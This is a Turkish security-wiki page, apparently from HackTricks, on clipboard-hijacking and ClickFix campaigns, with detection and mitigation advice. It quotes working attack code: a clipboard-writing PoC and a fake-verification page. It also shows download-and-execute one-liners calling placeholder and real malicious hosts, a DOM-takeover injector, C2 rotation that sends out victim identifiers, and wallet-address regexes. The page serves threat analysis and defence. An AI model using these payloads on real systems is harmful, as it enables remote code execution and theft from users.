# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Kendiniz kopyalamadığınız hiçbir şeyi asla yapıştırmayın." – eski ama hâlâ geçerli bir tavsiye

## Genel Bakış

Clipboard hijacking – *pastejacking* olarak da bilinir – kullanıcıların komutları incelemeden rutin olarak kopyalayıp yapıştırmasından yararlanır. Kötü amaçlı bir web sayfası (veya Electron ya da Desktop uygulaması gibi JavaScript çalıştırabilen herhangi bir ortam), saldırganın kontrolündeki metni programatik olarak sistem clipboard'una yerleştirir. Kurbanlar, genellikle özenle hazırlanmış social engineering talimatlarıyla, **Win + R** (Run iletişim kutusu), **Win + X** (Quick Access / PowerShell) tuşlarına basmaya veya bir terminal açıp clipboard içeriğini *yapıştırmaya* yönlendirilir; böylece rastgele komutlar hemen çalıştırılır.

**Hiçbir dosya indirilmediği ve hiçbir ek açılmadığı** için bu teknik; ekleri, makroları veya doğrudan komut çalıştırmayı izleyen çoğu e-posta ve web içeriği güvenlik denetimini atlatır. Bu nedenle saldırı, NetSupport RAT, Latrodectus loader veya Lumma Stealer gibi yaygın malware ailelerini dağıtan phishing kampanyalarında popülerdir.<sup>[[1]](#references)</sup>

## Cüzdan adresi değiştiren clipper'lar

Bir başka **clipboard hijacking** çeşidi hiç komut yapıştırmaz: kurbanın bir **cryptocurrency cüzdan adresi** kopyalamasını bekler, ardından yapıştırma işleminden hemen önce adresi sessizce saldırganın kontrolündeki bir adresle değiştirir. Kullanıcılar genellikle yalnızca ilk ve son karakterleri kontrol ettiğinden bu yöntem uzun cüzdan adreslerinde özellikle etkilidir.<sup>[[8]](#references)</sup>

Yaygın gerçek dünya özellikleri:
- **İnce loader + iç içe payload**: Görünür uygulama/exe, meşru bir alım satım veya "kâr" aracı gibi görünürken gerçek clipper paketin daha derinlerinde gizlidir (örneğin, iç içe bir Rust payload'u başlatan bir .NET loader).
- **Regex tabanlı değiştirme**: Malware, `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` gibi dizeleri, hatta genel **44 karakterli Solana benzeri** dizeleri eşleştirir ve saldırganın cüzdan adresleriyle değiştirir.
- **Geniş ölçekte cüzdan rotasyonu**: Modern Windows örnekleri, her hırsızlıktan sonra cüzdan itibarının zarar görmesini azaltmak için tek bir sabit adres yerine her para birimi için **binlerce** değiştirme cüzdan adresi içerebilir.<sup>[[8]](#references)</sup>

### Windows clipper akışı

Yaygın bir uygulama, **`AddClipboardFormatListener`** ile kaydedilmiş gizli bir penceredir. Her clipboard güncellemesinde malware genellikle şunları çağırır:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → mevcut clipboard verilerine erişir.
- **`GetClipboardData`** → metni okur.
- **`EmptyClipboard`** + **`SetClipboardData`** → cüzdan adresini saldırganın değeriyle değiştirir.

Clippers'da sıkça görülen temel hunting regex'leri:

```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```

Kullanıcı düzeyinde kalıcılık, etki yaratmak için yeterlidir. Gözlemlenen bir yöntem şöyledir:<sup>[[8]](#references)</sup>
- Payload'ı **`%APPDATA%\silke\silke.exe`** konumuna kopyalama
- `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` altında bir **Startup klasörü LNK'si** oluşturma

Tespit fikirleri:
- `%APPDATA%` altına ve kullanıcının **Startup** klasörüne yazarken sürekli clipboard API'lerini çağıran process'ler.
- Cüzdan adreslerinin clipboard'da yeniden yazılmasının ardından yeni LNK/executable oluşturulması.
- Çok sayıda kullanılmayan dosya içeren arşivler veya sahte yazılım paketleri ve iç içe bir binary'yi başlatan küçük bir launcher.

### macOS sosyal mühendislikle karantina kaldırma + LaunchAgent kalıcılığı

macOS'ta bazı kampanyalar bir **`unlocker.command`** yardımcı dosyası gönderir ve Gatekeeper uygulamanın hasarlı olduğunu veya tanımlanamayan bir geliştiriciden geldiğini söylerse kurbana sağ tıklayıp → **Aç** seçeneğine tıklamasını söyler. Script yalnızca karantinayı kaldırır ve yakındaki `.app` dosyasını başlatır:<sup>[[8]](#references)</sup>

```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```

Bu bir **Gatekeeper exploit’i** değildir; `com.apple.quarantine` xattr’ına bağlı Gatekeeper kararlarını kötüye kullanan **sosyal mühendislikle gerçekleştirilmiş bir quarantine bypass** yöntemidir.<sup>[[8]](#references)</sup>

Çalıştırıldıktan sonra clipper, aşağıdakileri yazarak mevcut kullanıcı olarak kalıcı olabilir:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – `RunAtLoad` ve `KeepAlive` içeren LaunchAgent

Savunma açısından önemli bir ayrıntı: Bazı örnekler, LaunchAgent’ı ve wrapper’ı yaklaşık 30 saniyede bir yeniden yazan **kendini onaran bir watchdog** uygular. Çalışan süreci sonlandırmadan önce plist’i kaldırırsanız **malware** onu hemen yeniden oluşturabilir.<sup>[[8]](#references)</sup> Güvenli temizleme sırası:
1. Etkin clipper sürecini sonlandırın.
2. LaunchAgent plist’ini unload edip silin.
3. `~/launch.sh` dosyasını ve kopyalanan payload’ı silin.

### Dağıtım notu: sahte itibarın etkiyi artırması

Bu ailede malware teknik açıdan basit kalabilir; asıl işi **dağıtım katmanı** yapar: Sahte GitHub yıldızları/fork’ları, SourceForge incelemeleri/indirmeleri, YouTube eğitim yorumları/izlenmeleri ve zararsız görünen VirusTotal yorumları/oyları, binary’nin çalıştırılmadan önce güvenilir görünmesini sağlamak için kullanılır.<sup>[[8]](#references)</sup>

## Zorunlu kopyalama düğmeleri ve gizli payload’lar (macOS tek satırlık komutları)

Bazı macOS infostealer’ları, yükleyici sitelerini (ör. Homebrew) kopyalar ve kullanıcıların yalnızca görünen metni seçmesini engellemek için **“Copy” düğmesinin kullanılmasını zorunlu kılar**. Panodaki içerik, beklenen yükleyici komutunun yanı sıra sona eklenmiş bir Base64 payload’ı da içerir (ör. `...; echo <b64> | base64 -d | sh`); böylece tek seferde yapıştırma her ikisini de çalıştırırken arayüz ek aşamayı gizler.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept

```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
  navigator.clipboard.writeText(payload)
    .then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```

Eski kampanyalarda `document.execCommand('copy')` kullanılırken, yenileri asenkron **Clipboard API**'ye (`navigator.clipboard.writeText`) dayanır.<sup>[[2]](#references)</sup>

## ClickFix / ClearFake Akışı

1. Kullanıcı typosquatting uygulanmış veya ele geçirilmiş bir siteyi ziyaret eder (ör. `docusign.sa[.]com`)
2. Enjekte edilmiş **ClearFake** JavaScript'i, Base64 ile kodlanmış bir PowerShell one-liner'ını panoya sessizce kaydeden `unsecuredCopyToClipboard()` yardımcı işlevini çağırır.
3. HTML talimatları kurbana şunu söyler: *“Sorunu çözmek için **Win + R** tuşlarına basın, komutu yapıştırın ve Enter'a basın.”*
4. `powershell.exe` çalışır ve meşru bir yürütülebilir dosya ile kötü amaçlı bir DLL içeren bir arşiv indirir (klasik DLL sideloading).
5. Loader ek aşamaların şifresini çözer, shellcode enjekte eder ve kalıcılık sağlar (ör. zamanlanmış görev) – sonuçta NetSupport RAT / Latrodectus / Lumma Stealer çalıştırılır.<sup>[[1]](#references)</sup>

### Örnek NetSupport RAT Zinciri

```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```

* `jp2launcher.exe` (meşru Java WebStart), kendi dizininde `msvcp140.dll` dosyasını arar.
* Kötü amaçlı DLL, **GetProcAddress** ile API'leri dinamik olarak çözümler, **curl.exe** aracılığıyla iki binary (`data_3.bin`, `data_4.bin`) indirir, bunların şifrelerini döngüsel XOR anahtarı `"https://google.com/"` kullanarak çözer, son shellcode'u enjekte eder ve **client32.exe** dosyasını (NetSupport RAT) `C:\ProgramData\SecurityCheck_v1\` dizinine açar.<sup>[[1]](#references)</sup>

### Latrodectus Yükleyicisi

```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```

1. **curl.exe** ile `la.txt` dosyasını indirir
2. JScript downloader'ı **cscript.exe** içinde çalıştırır
3. Bir MSI payload'ı indirir → imzalı bir uygulamanın yanına `libcef.dll` bırakır → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### MSHTA aracılığıyla Lumma Stealer

```
mshta https://iplogger.co/xxxx =+\\xxx
```

**mshta** çağrısı, `PartyContinued.exe` dosyasını alan gizli bir PowerShell scripti başlatır, `Boat.pst` (CAB) dosyasını çıkarır, `extrac32` ve dosya birleştirme yoluyla `AutoIt3.exe` dosyasını yeniden oluşturur ve son olarak tarayıcı kimlik bilgilerini `sumeriavgv.digital` adresine sızdıran bir `.a3x` scripti çalıştırır.<sup>[[1]](#references)</sup>

## ClickFix: Pano → PowerShell → JS eval → Dönen C2 kullanan Startup LNK (PureHVNC)

Bazı ClickFix kampanyaları dosya indirmeyi tamamen atlar ve kurbanlara WSH aracılığıyla JavaScript alan ve çalıştıran, kalıcılık sağlayan ve C2 adresini her gün değiştiren tek satırlık bir komut yapıştırmalarını söyler. Gözlemlenen zincire örnek:<sup>[[3]](#references)</sup>

```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new 
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```

Temel özellikler
- Gündelik incelemeyi engellemek için gizlenmiş URL çalışma zamanında tersine çevrilir.
- JavaScript, bir Startup LNK (WScript/CScript) aracılığıyla kalıcılık sağlar ve C2'yi geçerli güne göre seçerek alan adının hızla değiştirilmesini mümkün kılar.<sup>[[3]](#references)</sup>

C2'leri tarihe göre döndürmek için kullanılan minimal JS parçası:<sup>[[3]](#references)</sup>
```js
function getURL() {
    var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
    var current_datetime = new Date().getTime();
    var no_days = getDaysDiff(0, current_datetime);
    return 'https://'
        + getListElement(C2_domain_list, no_days)
        + '/Y/?t=' + current_datetime
        + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```

Bir sonraki aşamada genellikle persistence sağlayan ve bir RAT (ör. PureHVNC) indiren bir loader devreye alınır; loader çoğu zaman TLS bağlantısını sabit kodlanmış bir sertifikaya sabitler ve trafiği parçalara böler.<sup>[[3]](#references)</sup>

Bu varyanta özgü tespit ipuçları
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (veya `cscript.exe`).
- Startup artifacts: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` içindeki, `%TEMP%`/`%APPDATA%` altında bulunan bir JS yoluyla WScript/CScript’i çalıştıran LNK dosyası.
- `.split('').reverse().join('')` veya `eval(a.responseText)` içeren Registry/RunMRU ve command-line telemetry.
- Uzun command line’lar kullanmadan uzun script’leri iletmek için büyük stdin payload’ları alan, tekrarlanan `powershell -NoProfile -NonInteractive -Command -` komutları.
- Daha sonra, updater’ı andıran bir task/path altında (ör. `\GoogleSystem\GoogleUpdater`) `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` gibi LOLBins çalıştıran Scheduled Tasks.

Threat hunting
- Günlük olarak değişen C2 hostname’leri ve `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` biçimindeki URL’ler.
- Clipboard write event’lerini, ardından gelen Win+R paste işlemi ve hemen sonrasındaki `powershell.exe` çalıştırmasıyla ilişkilendirin.

Blue-teams, pastejacking kötüye kullanımını tespit etmek için clipboard, process-creation ve registry telemetry verilerini bir arada kullanabilir:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`, **Win + R** komutlarının geçmişini tutar; olağandışı Base64 / obfuscated girdileri arayın.
* `ParentImage` == `explorer.exe` ve `NewProcessName` ∈ { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } olan Security Event ID **4688** (Process Creation).
* Şüpheli 4688 event’inden hemen önce `%LocalAppData%\Microsoft\Windows\WinX\` veya temporary folder’lar altında dosya oluşturulmasına ilişkin Event ID **4663**.
* EDR clipboard sensors (varsa) – `Clipboard Write` event’ini hemen ardından başlayan yeni bir PowerShell process’iyle ilişkilendirin.

## IUAM tarzı doğrulama sayfaları (ClickFix Generator): clipboard’dan konsola kopyalama + OS-aware payload’lar

Yakın tarihli kampanyalar, kullanıcıları OS’ye özgü komutları clipboard’larından yerel konsollara kopyalamaya zorlayan sahte CDN/browser doğrulama sayfalarını ("Just a moment…", IUAM tarzı) toplu olarak üretiyor. Bu yöntem, çalıştırmayı browser sandbox’ının dışına taşır ve Windows ile macOS’ta çalışır.<sup>[[4]](#references)</sup>

Builder tarafından oluşturulan sayfaların temel özellikleri
- Payload’ları uyarlamak için `navigator.userAgent` üzerinden OS tespiti (Windows PowerShell/CMD ve macOS Terminal). İllüzyonu sürdürmek için desteklenmeyen OS’lerde isteğe bağlı decoy/no-op’lar.
- Zararsız UI eylemlerinde (checkbox/Copy) otomatik clipboard kopyalama; görünür metin, clipboard içeriğinden farklı olabilir.
- Mobile blocking ve adım adım talimatlar içeren bir popover: Windows → Win+R→paste→Enter; macOS → Terminal’i aç→paste→Enter.
- Ele geçirilmiş bir sitenin DOM’unu Tailwind ile stillendirilmiş bir doğrulama arayüzüyle değiştirmek için isteğe bağlı obfuscation ve tek dosyalı injector (yeni bir domain kaydı gerekmez).<sup>[[4]](#references)</sup>

Örnek: clipboard uyuşmazlığı + OS-aware branching
```html
<div class="space-y-2">
  <label class="inline-flex items-center space-x-2">
    <input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
  </label>
  <div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
  // UI shows a harmless string, but clipboard gets the real command
  navigator.clipboard.writeText(real).then(()=>{
    document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
  });
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```

macOS'ta ilk çalıştırma kalıcılığı
- Terminal kapandıktan sonra da yürütmenin devam etmesi ve görünür izlerin azaltılması için `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` kullanın.<sup>[[4]](#references)</sup>

Ele geçirilmiş sitelerde sayfanın yerinde devralınması
```html
<script>
(async () => {
  const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
  document.documentElement.innerHTML = html;                 // overwrite DOM
  const s = document.createElement('script');
  s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
  document.head.appendChild(s);
})();
</script>
```

IUAM tarzı tuzaklara özgü tespit ve avlama fikirleri
- Web: Clipboard API’yi doğrulama widget’larına bağlayan sayfalar; görüntülenen metin ile panoya yazılan içerik arasındaki uyumsuzluk; `navigator.userAgent` ile dallanma; şüpheli bağlamlarda Tailwind + tek sayfa değiştirme.
- Windows uç noktası: Tarayıcı etkileşiminden kısa süre sonra `explorer.exe` → `powershell.exe`/`cmd.exe`; `%TEMP%` konumundan çalıştırılan batch/MSI yükleyicileri.
- macOS uç noktası: Tarayıcı olayları civarında Terminal/iTerm’in `bash`/`curl`/`base64 -d` süreçlerini `nohup` ile başlatması; terminal kapatıldıktan sonra arka plan işlerinin çalışmaya devam etmesi.
- `RunMRU` Win+R geçmişini ve pano yazma olaylarını, ardından oluşturulan konsol süreçleriyle ilişkilendirin.

Destekleyici teknikler için ayrıca bkz.

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026’daki sahte CAPTCHA / ClickFix evrimleri (ClearFake, Scarlet Goldfinch)

- ClearFake, WordPress sitelerini ele geçirmeyi ve harici sunucuları (Cloudflare Workers, GitHub/jsDelivr) zincirleyen yükleyici JavaScript enjekte etmeyi sürdürüyor. Ayrıca güncel tuzak mantığını almak için blockchain “etherhiding” çağrıları da kullanıyor (ör. `bsc-testnet.drpc[.]org` gibi Binance Smart Chain API uç noktalarına POST istekleri). Son dönemdeki katmanlarda, kullanıcıları herhangi bir şey indirmek yerine tek satırlık bir komutu kopyalayıp yapıştırmaya yönlendiren sahte CAPTCHA’lar (T1204.004) yoğun biçimde kullanılıyor.<sup>[[6]](#references)</sup>
- İlk çalıştırma giderek imzalı script host’larına/LOLBAS’a devrediliyor. Ocak 2026 zincirlerinde, önceki `mshta` kullanımı yerine yerleşik `SyncAppvPublishingServer.vbs` kullanıldı; bu betik, uzak içeriği almak için takma adlar/joker karakterler içeren PowerShell benzeri argümanlarla `WScript.exe` üzerinden çalıştırıldı:<sup>[[6]](#references)</sup>

```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```

  - `SyncAppvPublishingServer.vbs` imzalıdır ve normalde App-V tarafından kullanılır; `WScript.exe` ve alışılmadık argümanlarla (`gal`/`gcm` takma adları, joker karakterli cmdlet'ler, jsDelivr URL'leri) birlikte kullanıldığında ClearFake için yüksek sinyalli bir LOLBAS aşamasına dönüşür.<sup>[[6]](#references)</sup>
- Şubat 2026'daki sahte CAPTCHA payload'ları yeniden yalnızca PowerShell download cradle'larına yöneldi. İşte çalışan iki örnek:<sup>[[6]](#references)</sup>

```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```

  - İlk zincir bellek içi bir `iex(irm ...)` grabber'dır; ikincisi `WinHttp.WinHttpRequest.5.1` üzerinden aşamalandırma yapar, geçici bir `.ps1` dosyası yazar ve ardından gizli bir pencerede `-ep bypass` ile başlatır.<sup>[[6]](#references)</sup>

Bu varyantlar için tespit/avlama ipuçları
- Süreç soy ağacı: tarayıcı → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` veya panoya yazma/Win+R işlemlerinin hemen ardından PowerShell cradle'ları.
- Komut satırı anahtar sözcükleri: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker alan adları veya ham IP içeren `iex(irm ...)` kalıpları.
- Ağ: web'de gezinmeden kısa süre sonra script host'larından/PowerShell'den CDN worker host'larına veya blockchain RPC uç noktalarına giden bağlantılar.
- Dosya/kayıt defteri: `%TEMP%` altında geçici `.ps1` oluşturulması ve bu tek satırlık komutları içeren RunMRU girdileri; harici URL'ler veya gizlenmiş takma ad dizeleriyle çalışan imzalı script LOLBAS'larına (WScript/cscript/mshta) karşı engelleme/uyarı oluşturun.

## Haziran 2026 ClickFix taktikleri: yapıştırma telemetrisi, sahte doğrulama yorumları ve LOLBin zincirleme

Red Canary'nin yakın tarihli telemetrisi, istikrarlı göstergenin **tek bir kesin komut değil**; **kullanıcı yardımıyla yapıştırma ve çalıştırma**, **güvenilir yorumlayıcılar/LOLBins**, **gizlenmiş bayraklar**, **uzaktan alma** ve **anında çalıştırma** birleşimi olduğunu gösteriyor.<sup>[[7]](#references)</sup>

### Dikkat çeken operatör kalıpları

- **Yapıştırma onayı telemetrisi**: bazı payload'lar gerçek aşamadan önce `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` çağrısı yapar. Bu, pencereyi kısa ve sessiz tutarken kullanıcı etkileşimini doğrular.
- **Sahte doğrulama yorumları**: PowerShell tek satırlık komutlarına `# Security check ✔️ I'm not a robot Verification ID: 138105` gibi dizeler eklenebilir; böylece komut Run / `cmd.exe` / PowerShell geçmişine yapıştırıldıktan sonra CAPTCHA ile ilgiliymiş gibi görünmeye devam eder.
- **Dinamik URL yeniden oluşturma**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` komut satırında sabit bir URL bulunmasını önlerken bellek içi indirme ve çalıştırma işlemini gerçekleştirir.
- **Kılık değiştirmiş yükleyici çalıştırma**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q`, kırılgan tespitleri aşmak için bayraklarda alışılmadık büyük/küçük harf kullanımı ve Unicode benzeri karakterlerden yararlanırken `msiexec.exe`'yi andırır.
- **Şapka karakteriyle kaçırılmış LOLBin zincirleri**: `cmd.exe`, anahtar sözcükleri `^` kaçışlarıyla gizleyebilir (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), iç içe kabuğu küçültülmüş olarak başlatabilir, saldırgan içeriğini `.pdf` gibi zararsız bir uzantıyla kaydedebilir ve ardından `mshta` üzerinden çalıştırabilir.<sup>[[7]](#references)</sup>
## Azaltma

1. Tarayıcıyı sağlamlaştırma – pano yazma erişimini devre dışı bırakın (`dom.events.asyncClipboard.clipboardItem` vb.) veya kullanıcı hareketi gerektirin.
2. Güvenlik farkındalığı – kullanıcılara hassas komutları *yazmalarını* veya önce bir metin düzenleyiciye yapıştırmalarını öğretin.
3. PowerShell Constrained Language Mode / Execution Policy ve Application Control kullanarak rastgele tek satırlık komutları engelleyin.
4. Ağ denetimleri – bilinen pastejacking ve malware C2 alan adlarına giden istekleri engelleyin.

## İlgili Teknikler

* **Discord Invite Hijacking**, kullanıcıları kötü amaçlı bir sunucuya çekmek için genellikle aynı ClickFix yaklaşımını kullanır:
  
{{#ref}}
  discord-invite-hijacking.md
  {{#endref}}

## References

- [1] [ClickFix Saldırı Vektörünü Önleme](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Saf Perdenin Ardında: RAT'tan Builder'a, Builder'dan Coder'a](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [ClickFix Fabrikası: IUAM ClickFix Oluşturucusunun İlk Kez Ortaya Çıkarılması](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, Infostealer yılı](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – İstihbarat İçgörüleri: Şubat 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – İstihbarat İçgörüleri: Haziran 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Yıldızlardan Olumlu Oylarına: Sahte İtibarla Beslenen Bir Kripto Pano Ele Geçiricisi](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
